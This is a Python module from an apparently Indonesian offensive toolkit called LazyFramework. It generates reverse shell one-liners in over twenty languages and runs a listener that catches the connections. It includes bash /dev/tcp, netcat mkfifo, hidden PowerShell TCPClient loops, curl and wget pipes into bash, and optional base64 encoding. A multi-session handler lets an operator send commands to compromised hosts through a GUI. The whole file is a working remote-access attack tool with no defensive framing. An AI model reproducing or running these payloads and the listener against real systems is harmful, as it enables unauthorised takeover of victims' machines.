#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
LazyFramework - Reverse TCP Multi-Language 22+
FIXED: Session auto-detection untuk GUI PyQt6 & Command Execution
"""

import socket
import threading
import time
import select
import base64
from rich.console import Console
from rich.panel import Panel
import sys # Tambahkan import sys untuk Python 3.x, meskipun mungkin sudah ada

console = Console()

SESSIONS = {}
SESSIONS_LOCK = threading.Lock()

# ==================== WAJIB UNTUK gui.py ====================
MODULE_INFO = {
    "name": "Reverse TCP Multi-Language (22+)",
    "description": "Reverse shell 22+ bahasa + auto session detection",
    "author": "LazyFramework Indo",
    "rank": "Excellent"
}

OPTIONS = {
    "LHOST":   {"default": "0.0.0.0", "required": True},
    "LPORT":   {"default": 4444,      "required": True},
    "PAYLOAD": {"default": "python",  "required": True},
    "OUTPUT":  {"default": "",        "required": False},
    "ENCODE":  {"default": "no",      "required": False}
}
# =============================================================

def generate_payload(lhost, lport, lang):
    """Menghasilkan payload reverse shell berdasarkan bahasa."""
    payloads = {
        "python": f"""import socket,os,pty,time
while True:
 try:
  s=socket.socket();s.connect(("{lhost}",{lport}))
  [os.dup2(s.fileno(),f) for f in (0,1,2)]
  pty.spawn("/bin/bash")
  s.send(b"stty raw -echo; clear\\n")
  s.send(b"export PS1=\\n")
 except: time.sleep(5)""",

        "bash": f"""bash -i >& /dev/tcp/{lhost}/{lport} 0>&1""",
        "nc": f"""rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f""",
        "php": f"""<?php set_time_limit(0);$s=fsockopen("{lhost}",{lport});$p=proc_open("/bin/sh -i",[0=>$s,1=>$s,2=>$s],$x);?>""",
        "perl": f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
        "ruby": f"""ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{lhost}",{lport});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'""",
        "netcat": f"""nc -e /bin/sh {lhost} {lport}""",
        "powershell": f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
        "awk": f"""awk 'BEGIN {{s = "/inet/tcp/0/{lhost}/{lport}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null""",
        "java": f"""public class Reverse {{ public static void main(String[] args) {{ try {{ Runtime r = Runtime.getRuntime(); Process p = r.exec("/bin/bash"); String cmd = "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"; p.getOutputStream().write(cmd.getBytes()); p.getOutputStream().close(); }} catch(Exception e) {{}} }} }}""",
        "lua": f"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}',{lport});os.execute('/bin/sh -i <&3 >&3 2>&3');" """,
        "nodejs": f"""node -e "require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')" """,
        "go": f"""echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go""",
        "wget": f"""wget -qO- http://{lhost}:{lport}/shell.sh | bash""",
        "curl": f"""curl http://{lhost}:{lport}/shell.sh | bash""",
        "telnet": f"""telnet {lhost} {lport} | /bin/sh | telnet {lhost} {lport}""",
        "socat": f"""socat TCP:{lhost}:{lport} EXEC:/bin/bash""",
        "dart": f"""dart -e 'import "dart:io";Process.start("/bin/bash", []).then((p) {{p.stdin.transform(systemEncoding.decoder).listen(print);}})'""",
        "rust": f"""use std::net::TcpStream;use std::process::Command;use std::os::unix::io::{{FromRawFd, IntoRawFd}};fn main(){{let s = TcpStream::connect("{lhost}:{lport}").unwrap();let fd = s.into_raw_fd();unsafe{{Command::new("/bin/sh").stdin(std::os::unix::io::FromRawFd::from_raw_fd(fd)).stdout(std::os::unix::io::FromRawFd::from_raw_fd(fd)).stderr(std::os::unix::io::FromRawFd::from_raw_fd(fd)).spawn().unwrap().wait().unwrap();}}}}""",
        "c": f"""#include <stdio.h>#include <sys/socket.h>#include <netinet/in.h>#include <unistd.h>int main(){{int s;struct sockaddr_in a={{AF_INET,htons({lport}),inet_addr("{lhost}")}};s=socket(AF_INET,SOCK_STREAM,0);connect(s,(struct sockaddr*)&a,sizeof(a));dup2(s,0);dup2(s,1);dup2(s,2);execl("/bin/sh","sh",0);}}""",
        "windows": f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
    }
    return payloads.get(lang.lower(), "# Payload tidak ada")

def safe_gui_update(gui_instance, method_name, *args):
    """Thread-safe GUI update untuk PyQt6"""
    if not gui_instance:
        return

    try:
        # PyQt6
        from PyQt6.QtCore import QTimer
        # Menggunakan QMetaObject.invokeMethod jika perlu, tapi QTimer.singleShot lebih sederhana
        # untuk memastikan eksekusi di main thread
        QTimer.singleShot(0, lambda: getattr(gui_instance, method_name)(*args) if hasattr(gui_instance, method_name) else None)
    except Exception as e:
        # Menghindari error jika tidak menggunakan PyQt6
        if 'QMainWindow' in str(e):
             # Abaikan jika hanya digunakan di CLI
             pass 
        else:
             print(f"GUI update error: {e}")

def handler(client_sock, addr, framework_session):
    """Handle incoming reverse shell connections"""
    sess_id = f"{addr[0]}:{addr[1]}"
    
    # Get GUI instance from framework session
    gui_instance = framework_session.get('gui_instance')
    gui_sessions = framework_session.get('gui_sessions', {})
    
    # Session data
    session_data = {
        'id': sess_id,
        'socket': client_sock,
        'ip': addr[0],
        'port': addr[1],
        'type': 'reverse_tcp',
        'lhost': framework_session.get('LHOST', '0.0.0.0'),
        'lport': framework_session.get('LPORT', 4444),
        'rhost': addr[0],
        'rport': addr[1],
        'output': f"[*] Session {sess_id} created\nType: reverse_tcp\nLHOST: {framework_session.get('LHOST', '0.0.0.0')}\nLPORT: {framework_session.get('LPORT', 4444)}\n\n",
        'handler': None,
        'status': 'alive',
        'created': time.strftime("%H:%M:%S")
    }

    # === CRITICAL: Simpan ke GUI sessions ===
    if gui_sessions and isinstance(gui_sessions, dict):
        sessions_dict = gui_sessions.get('dict', {})
        sessions_lock = gui_sessions.get('lock')
        
        if sessions_lock:
            with sessions_lock:
                sessions_dict[sess_id] = session_data
        else:
            sessions_dict[sess_id] = session_data

    # Simpan ke global sessions juga
    with SESSIONS_LOCK:
        SESSIONS[sess_id] = session_data

    # === CRITICAL: Output yang DIBACA oleh GUI auto-detection ===
    output_pattern = f"Session {sess_id} opened ({addr[0]}:{addr[1]} -> {framework_session.get('LHOST', '0.0.0.0')}:{framework_session.get('LPORT', 4444)})"
    console.print(f"\n[bold green][+] {output_pattern}[/]")
    
    # Thread-safe GUI update
    safe_gui_update(gui_instance, "update_sessions_ui")
    
    # Auto-switch ke sessions tab
    safe_gui_update(gui_instance, "switch_to_sessions_tab")

    # Setup shell bersih
    try:
        # Mengirim stty raw dan clear untuk shell interaktif yang stabil
        client_sock.send(b"export TERM=xterm-256color; stty raw -echo; clear\n")
        time.sleep(0.4)
        # Menghapus PS1 agar output lebih bersih
        client_sock.send(b"export PS1=''\n")
    except: 
        pass

    try:
        while True:
            r, _, _ = select.select([client_sock], [], [], 0.3)
            if r:
                data = client_sock.recv(4096)
                if not data: 
                    break
                    
                # Decode data yang diterima
                raw = data.decode('utf-8', errors='replace')
                for line in raw.replace('\r','').split('\n'):
                    line = line.strip()
                    if not line: 
                        continue
                    # Filter output dari setup shell/prompt
                    if any(x in line for x in [sess_id, "lazy1", "$ ", "# ", "PS1", "stty", "clear"]): 
                        continue

                    # Update session output di global SESSIONS
                    with SESSIONS_LOCK:
                        if sess_id in SESSIONS:
                            SESSIONS[sess_id]['output'] += line + "\n"
                    
                    # Update GUI sessions juga (jika ada)
                    if gui_sessions and isinstance(gui_sessions, dict):
                        sessions_dict = gui_sessions.get('dict', {})
                        if sess_id in sessions_dict:
                            sessions_dict[sess_id]['output'] += line + "\n"
                    
                    # Update GUI output thread-safe
                    safe_gui_update(gui_instance, "append_session_output", sess_id, line)

    except Exception as e:
        console.print(f"[red]Handler error: {e}[/]")
    finally:
        # Cleanup saat sesi ditutup
        try:
            client_sock.close()
        except:
            pass
            
        with SESSIONS_LOCK:
            SESSIONS.pop(sess_id, None)
            
        # Update GUI sessions
        if gui_sessions and isinstance(gui_sessions, dict):
            sessions_dict = gui_sessions.get('dict', {})
            sessions_lock = gui_sessions.get('lock')
            
            if sessions_lock:
                with sessions_lock:
                    sessions_dict.pop(sess_id, None)
            else:
                sessions_dict.pop(sess_id, None)
                
        safe_gui_update(gui_instance, "update_sessions_ui")
        console.print(f"[bold red][-] Session {sess_id} closed[/]\n")

def start_listener(lhost, lport, framework_session):
    """Start TCP listener"""
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((lhost, lport))
    s.listen(50)
    
    # === CRITICAL: Output penting untuk GUI ===
    console.print(f"[bold cyan][*] Listening {lhost}:{lport} → Multi-Language + GUI Ready![/]")
    console.print(f"[bold yellow][!] Session akan otomatis muncul di tab Sessions ketika ada koneksi[/]")
    
    try:
        while True:
            client, addr = s.accept()
            threading.Thread(
                target=handler, 
                args=(client, addr, framework_session), 
                daemon=True
            ).start()
    except KeyboardInterrupt:
        console.print("[yellow][!] Listener stopped[/]")
    except Exception as e:
        console.print(f"[red][!] Listener error: {e}[/]")
    finally:
        try:
            s.close()
        except:
            pass

# =========================================================
# FUNGSI KRUSIAL UNTUK INTEGRASI COMMAND DARI GUI (gui.py)
# =========================================================
def send_command_to_session(session_id: str, command: str) -> bool:
    """Mengirim perintah ke sesi reverse shell yang aktif."""
    with SESSIONS_LOCK:
        if session_id not in SESSIONS:
            print(f"[!] Gagal: Sesi {session_id} tidak ditemukan.")
            return False
            
        session_data = SESSIONS[session_id]
        client_sock = session_data.get('socket')
        
        if not client_sock:
            print(f"[!] Gagal: Socket sesi {session_id} tidak valid.")
            return False
            
        try:
            # PENTING: Tambahkan \n (newline/Enter) agar perintah dieksekusi di shell target
            full_command = command.strip() + "\n"
            client_sock.sendall(full_command.encode('utf-8'))
            
            # Catat perintah yang dikirim di log sesi (BUKAN output shell sebenarnya)
            session_data['output'] += f"[*] COMMAND: {command}\n"
            
            return True
        except Exception as e:
            # Cleanup jika koneksi putus saat pengiriman
            console.print(f"[red]Gagal mengirim perintah ke {session_id}: {e}[/]")
            try:
                client_sock.close()
            except:
                pass
            SESSIONS.pop(session_id, None)
            return False
# =========================================================

def run(session, options):
    """Main module execution"""
    lhost = options.get("LHOST", "0.0.0.0")
    lport = int(options.get("LPORT", 4444))
    lang  = options.get("PAYLOAD", "python").lower()
    output = options.get("OUTPUT", "")
    encode = options.get("ENCODE", "no").lower() == "yes"

    # Simpan settings ke session untuk GUI
    session['LHOST'] = lhost
    session['LPORT'] = lport

    payload = generate_payload(lhost, lport, lang)

    if encode:
        payload = base64.b64encode(payload.encode()).decode()
        console.print("[yellow][*] Payload di-encode base64[/]")

    if output:
        ext = {
            "python": ".py", "bash": ".sh", "php": ".php", "perl": ".pl", 
            "ruby": ".rb", "powershell": ".ps1", "go": ".go", "rust": ".rs",
            "c": ".c", "java": ".java", "nodejs": ".js", "windows": ".ps1"
        }.get(lang, ".txt")
        path = output if output.endswith(ext) else output + ext
        with open(path, "w") as f:
            f.write(payload)
        console.print(f"[green][+] Payload saved → {path}[/]")

    console.print(Panel(payload, title=f"PAYLOAD {lang.upper()}", border_style="bright_blue"))

    # Start listener dalam thread terpisah
    listener_thread = threading.Thread(
        target=start_listener, 
        args=(lhost, lport, session), 
        daemon=True
    )
    listener_thread.start()
    
    console.print("[green][+] Reverse TCP listener started![/]")
    console.print("[bold yellow][!] Jalankan payload di target, session akan muncul otomatis di tab Sessions[/]")